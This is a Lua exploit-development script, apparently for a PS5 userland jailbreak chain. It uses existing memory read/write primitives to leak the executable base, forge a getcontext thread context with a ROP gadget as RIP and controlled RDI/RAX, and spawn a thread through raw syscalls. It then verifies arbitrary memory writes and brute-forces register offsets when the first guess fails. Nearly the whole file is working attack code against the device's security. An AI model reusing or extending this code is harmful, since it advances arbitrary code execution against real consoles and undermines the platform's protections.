-- CRASH_CLASS: MODERATE
-- PROBE 80h: Thread write test with correct offsets
--
-- 80f proved: CS=0x43 at ctx+0xE8, SS=0x3B at ctx+0x100, RIP at ctx+0xE0
-- 80g proved: getcontext-based context gets rv=0 with CS=0x43
--
-- This probe:
--   1. Uses getcontext to get a valid context
--   2. Finds RDI offset by scanning getcontext output
--   3. Sets RIP=mov[rdi],eax;ret, RDI=marker, RAX=0xDEADBEEF
--   4. Creates thread, waits, checks marker

print("=== PROBE 80h: THREAD WRITE TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

syscall.resolve({ sc_getpid = 20 })
print("[*] pid=" .. tostring(syscall.sc_getpid():tonumber()))

-- Eboot
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eboot = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("[*] eboot=" .. q(eboot))

local ret_gadget = eboot + 0x42
local mov_rdi_eax = eboot + 0x92C68

-- ============================================================
-- Step 1: Find register offsets via getcontext
-- ============================================================
print("")
print("[1] Finding register offsets...")

-- Known from 80f:
-- ctx+0xE0 = RIP, ctx+0x80 = RAX (value was 0x73A8A976 in 80f)
-- ctx+0x88 = RBP (value was 0x7EFE5A890)
-- For FreeBSD mcontext, if RIP is at ctx+0xE0:
--   Count back: mc_rip is after mc_err(+0xD8), mc_addr(+0xD0), mc_flags2(+0xC8)...
--   Actually the PS5 mcontext from Ghidra (13.60) has this layout:
--   Starting from uc_mcontext (+0x10 in standard, but maybe different here):
--     mc_onstack, mc_rdi, mc_rsi, mc_rdx, mc_rcx, mc_r8, mc_r9,
--     mc_rax, mc_rbx, mc_rbp, mc_r10, mc_r11, mc_r12, mc_r13, mc_r14, mc_r15,
--     mc_trapno, mc_fs, mc_gs, mc_addr, mc_flags2, mc_err,
--     mc_rip, mc_cs, mc_rflags, mc_rsp, mc_ss
--
-- If mc_rax is at ctx+0x80 and each reg is 8 bytes:
--   mc_rax = ctx+0x80 → index 7 from mc start
--   mc start = ctx+0x80 - 7*8 = ctx+0x80 - 0x38 = ctx+0x48
--   mc_rdi = mc_start + 1*8 = ctx+0x50
--   mc_rsi = mc_start + 2*8 = ctx+0x58
--   mc_rdx = mc_start + 3*8 = ctx+0x60
--   mc_rcx = mc_start + 4*8 = ctx+0x68
--   mc_r8  = mc_start + 5*8 = ctx+0x70
--   mc_r9  = mc_start + 6*8 = ctx+0x78
--   mc_rax = mc_start + 7*8 = ctx+0x80 ✓
--   mc_rbx = mc_start + 8*8 = ctx+0x88 (but 80f shows rbp here!)
--
-- Wait, 80f showed: ctx+0x80 = rax, ctx+0x88 = rbp
-- Standard FreeBSD: rax=index7, rbx=index8, rbp=index9
-- If rbp is at ctx+0x88, then rbx would be... hmm.
-- Maybe Sony reordered: rax at +7, rbp at +8, rbx at +9?
-- Or: the order is rdi,rsi,rdx,rcx,r8,r9,rax,rbp,rbx,...
--
-- Let me just do it empirically: call getcontext inside a function
-- where we control rdi (it's the arg to getcontext = ctx ptr).
-- After getcontext, RDI = ctx address, so find where ctx's own address appears.

local ctx = memory.alloc(0x600)
zero(ctx, 0x600)

local sc_getctx = make_syscall(421)
pcall(function() sc_getctx(uint64(ctx)) end)

-- The getcontext syscall sets rdi = ctx (the argument we passed).
-- But actually, after the syscall, rdi may have been clobbered.
-- RAX = return value (0). Let's just dump and find patterns.
-- Actually, the most reliable: rax = 0 (syscall returns 0 on success)
-- and we know rax is at ctx+0x80 from 80f. But 80f showed rax = 0x73A8A976
-- which is NOT 0. So either rax was set to a different value by getcontext,
-- or our offset is wrong.
--
-- Hmm. Let's just dump the whole thing and look for known values.

print("  RIP position check: " .. q(rq(ctx + 0xE0)))
print("  CS check: 0x" .. string.format("%X", rd(ctx + 0xE8) or 0))

-- Find where the ctx address itself appears (that's RDI - the syscall arg)
local ctx_lo = to_num(ctx)
local ctx_hi = 0
if type(ctx) == "table" and ctx.h then ctx_hi = ctx.h end

print("  Looking for ctx addr " .. q(ctx) .. " in context dump...")
for off = 0x10, 0xD8, 8 do
    local val = rq(ctx + off)
    if val then
        local vh, vl = 0, 0
        if type(val) == "table" and val.h then vh = val.h; vl = val.l
        else vl = to_num(val) end
        -- Check if this matches ctx address (the RDI we passed to getcontext)
        if vl == ctx_lo and vh == ctx_hi then
            print("  *** ctx addr found at +0x" .. string.format("%02X", off) .. " — THIS IS mc_rdi ***")
        end
    end
end

-- Also dump all non-zero values in register area
print("")
print("  Non-zero values in register area (+0x10 to +0xD8):")
for off = 0x10, 0xD8, 8 do
    local val = rq(ctx + off)
    local h, l = 0, 0
    if type(val) == "table" then h = val.h or 0; l = val.l or 0 else l = to_num(val) end
    if h ~= 0 or l ~= 0 then
        print("    +0x" .. string.format("%02X", off) .. ": " .. q(val))
    end
end

-- ============================================================
-- Step 2: Create thread with write gadget
-- ============================================================
print("")
print("[2] Creating write thread...")

-- Get fresh context
zero(ctx, 0x600)
pcall(function() sc_getctx(uint64(ctx)) end)

-- Now set up for write
-- Override RIP
wq(ctx + 0xE0, mov_rdi_eax)    -- RIP = mov [rdi], eax; ret

-- GPU stack
local sc_mmap = make_syscall(477)
local s_ok, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(4 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local stack_top = stack_base + (3 * 0x4000)
zero(stack_top, 0x100)
wq(ctx + 0xF8, stack_top)       -- RSP

-- Set marker
local marker = memory.alloc(16)
zero(marker, 16)
wd(marker, 0x41414141)
print("  marker=" .. q(marker) .. " val=0x" .. string.format("%08X", rd(marker)))

-- We'll try the most likely RDI offset. If ctx addr was found above, use that.
-- Otherwise try +0x50 (our best guess from the analysis).
-- For RAX, we know it's at +0x80 from 80f.
local RDI_OFF = 0x50  -- best guess
local RAX_OFF = 0x80  -- confirmed from 80f

-- But wait: we need to NOT clobber CS/SS/RFLAGS which getcontext set correctly.
-- Our register writes are well below +0xE0, so they're safe.

wq(ctx + RDI_OFF, marker)              -- RDI = marker address
wq(ctx + RAX_OFF, uint64(0xDEADBEEF))  -- RAX = value to write

print("  RDI_OFF=+0x" .. string.format("%02X", RDI_OFF) .. " → " .. q(marker))
print("  RAX_OFF=+0x" .. string.format("%02X", RAX_OFF) .. " → 0xDEADBEEF")
print("  RIP=" .. q(rq(ctx + 0xE0)))
print("  CS=0x" .. string.format("%X", rd(ctx + 0xE8) or 0))
print("  RSP=" .. q(rq(ctx + 0xF8)))

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)

local ok, rv = pcall(function()
    local sc = make_syscall(430)
    return sc(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  thr_create rv=" .. tostring(rv) .. " ok=" .. tostring(ok))
print("  tid=" .. q(rq(tid_buf)))

-- Wait for thread
local dummy = 0
for i = 1, 5000000 do dummy = dummy + 1 end

local marker_val = rd(marker)
print("")
print("  marker after: 0x" .. string.format("%08X", marker_val or 0))

if marker_val == 0xDEADBEEF then
    print("")
    print("  ****************************************************")
    print("  *** DEADBEEF CONFIRMED — THREAD WROTE TO MEMORY! ***")
    print("  *** ARBITRARY USERLAND EXECUTION VIA THREAD ROP!  ***")
    print("  ****************************************************")

    -- Bonus: try a second write to prove it's repeatable
    wd(marker, 0)
    zero(ctx, 0x600)
    pcall(function() sc_getctx(uint64(ctx)) end)
    wq(ctx + 0xE0, mov_rdi_eax)
    wq(ctx + 0xF8, stack_top)
    zero(stack_top, 0x100)
    wq(ctx + RDI_OFF, marker + 4)
    wq(ctx + RAX_OFF, uint64(0xCAFEBABE))
    zero(tid_buf, 8)
    pcall(function()
        local sc = make_syscall(430)
        sc(uint64(ctx), uint64(tid_buf), uint64(0))
    end)
    for i = 1, 5000000 do dummy = dummy + 1 end
    print("  second write check: marker+4 = 0x" .. string.format("%08X", rd(marker + 4) or 0))
    if rd(marker + 4) == 0xCAFEBABE then
        print("  *** SECOND WRITE CONFIRMED — REPEATABLE! ***")
    end

elseif marker_val ~= 0x41414141 then
    print("  marker changed to 0x" .. string.format("%08X", marker_val) .. " — partial?")
else
    print("  marker unchanged — RDI offset may be wrong")
    print("  trying alternative offsets...")

    -- Try other RDI candidates
    for _, rdi_off in ipairs({0x18, 0x28, 0x38, 0x48, 0x58, 0x60, 0x68, 0x70, 0x78, 0x88, 0x98, 0xA8, 0xB8, 0xC8}) do
        if rdi_off ~= RDI_OFF then
            wd(marker, 0x41414141)
            zero(ctx, 0x600)
            pcall(function() sc_getctx(uint64(ctx)) end)
            wq(ctx + 0xE0, mov_rdi_eax)
            wq(ctx + 0xF8, stack_top)
            zero(stack_top, 0x100)
            wq(ctx + rdi_off, marker)
            wq(ctx + RAX_OFF, uint64(0xDEADBEEF))
            zero(tid_buf, 8)
            local ok2, rv2 = pcall(function()
                local sc = make_syscall(430)
                return sc(uint64(ctx), uint64(tid_buf), uint64(0))
            end)
            for i = 1, 2000000 do dummy = dummy + 1 end
            local mv = rd(marker)
            local rv2_num = to_num(rv2)
            if mv == 0xDEADBEEF then
                print("  *** RDI at +0x" .. string.format("%02X", rdi_off) .. " — MARKER WRITTEN! ***")
                break
            elseif rv2_num ~= 0 and not (type(rv2) == "table" and rv2.h == 0 and rv2.l == 0) then
                -- rv != 0 means we corrupted something important in the context
            elseif mv ~= 0x41414141 then
                print("  +0x" .. string.format("%02X", rdi_off) .. " rv=" .. tostring(rv2_num) .. " marker=0x" .. string.format("%08X", mv))
            end
        end
    end
end

local alive = pcall(function() return syscall.sc_getpid():tonumber() end)
print("")
print("[*] canary: " .. tostring(alive))
print("=== PROBE 80h COMPLETE ===")
